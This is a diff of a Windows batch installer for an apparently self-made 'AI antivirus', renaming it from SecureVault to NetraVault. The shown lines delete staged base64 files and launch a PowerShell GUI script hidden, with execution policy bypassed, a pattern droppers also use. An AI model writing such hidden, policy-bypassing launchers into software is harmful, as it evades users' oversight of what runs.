@@ -1,15 +1,15 @@
 @echo off
-title SecureVault AI Total Protection Setup
+title NetraVault AI Total Protection Setup
 color 0B
 echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 echo !!                                                        !!
-echo !!        SECUREVAULT: AI TOTAL DEFENSE SETUP             !!
+echo !!        NETRAVAULT: AI TOTAL DEFENSE SETUP             !!
 echo !!        STATUS: COGNITIVE SYSTEM SEEDING ACTIVE         !!
 echo !!                                                        !!
 echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 echo.
 
-set "INSTALL_DIR=%APPDATA%\SecureVault"
+set "INSTALL_DIR=%APPDATA%\NetraVault"
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
 echo [GHOST_SETUP] Stopping running protection daemons...
@@ -2127,19 +2127,19 @@ del /q "%INSTALL_DIR%\*.b64" >nul 2>&1
 
 :: 4. Create robust .bat Launcher on Desktop
 echo [GHOST_SETUP] Creating Desktop Launcher...
-del /f /q "%USERPROFILE%\Desktop\SecureVault AI Antivirus.lnk" >nul 2>&1
+del /f /q "%USERPROFILE%\Desktop\NetraVault AI Antivirus.lnk" >nul 2>&1
 
 (
 echo @echo off
-echo powershell.exe -WindowStyle Hidden -STA -ExecutionPolicy Bypass -File "%%APPDATA%%\SecureVault\sentinel_gui.ps1"
-) > "%USERPROFILE%\Desktop\SecureVault AI Antivirus.bat"
+echo powershell.exe -WindowStyle Hidden -STA -ExecutionPolicy Bypass -File "%%APPDATA%%\NetraVault\sentinel_gui.ps1"
+) > "%USERPROFILE%\Desktop\NetraVault AI Antivirus.bat"
 
 echo.
 echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-echo !!  [SUCCESS] SECUREVAULT AI TOTAL PROTECTION INSTALLED   !!
-echo !!  Launcher: 'SecureVault AI Antivirus' Shortcut on Desktop!!
+echo !!  [SUCCESS] NETRAVAULT AI TOTAL PROTECTION INSTALLED   !!
+echo !!  Launcher: 'NetraVault AI Antivirus' Shortcut on Desktop!!
 echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 echo.
 echo Launching the Antivirus Suite now...
-powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $WshShell.Run('powershell.exe -WindowStyle Hidden -STA -ExecutionPolicy Bypass -File "' + $env:APPDATA + '\SecureVault\sentinel_gui.ps1"', 0, $false)"
+powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $WshShell.Run('powershell.exe -WindowStyle Hidden -STA -ExecutionPolicy Bypass -File "' + $env:APPDATA + '\NetraVault\sentinel_gui.ps1"', 0, $false)"
 exit
